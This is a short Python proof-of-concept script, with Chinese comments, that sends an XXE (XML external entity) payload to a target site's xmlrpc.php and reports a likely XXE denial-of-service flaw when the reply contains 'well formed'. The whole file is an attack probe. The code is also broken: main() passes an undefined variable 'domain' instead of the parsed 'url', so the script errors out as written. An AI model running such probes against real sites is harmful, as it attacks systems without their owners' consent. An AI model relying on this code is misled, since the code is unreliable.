# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import sys
import hashlib
    
def poc(domain):
    headers = {} #消息头信息
    target = "%s/xmlrpc.php" % domain
    payload = """ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "a">%remote;]> """
    post_data = {      
        "" : payload, 
    }  #POST提交测试代码
    try:
        req = urllib.request.Request(target, data = urllib.parse.urlencode(post_data).encode("UTF-8"), method= "POST")
        response = urllib.request.urlopen(req)
        s = "well formed" #找到命令执行后的回显
        if response:
            data = response.read()
            data = str(data, encoding = "utf-8")
            #print(data)
            if data.find("well formed") != -1:   #获得了证明漏洞存在的回显
                print("likely - XXE DoS\n") 
            
    except Exception as e:
        print("Running Wrong...") 
        print(e)

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        poc(domain)
    else:
        print("Usage: python %s url" % (args[0]))
if __name__ == "__main__":
    main()
        


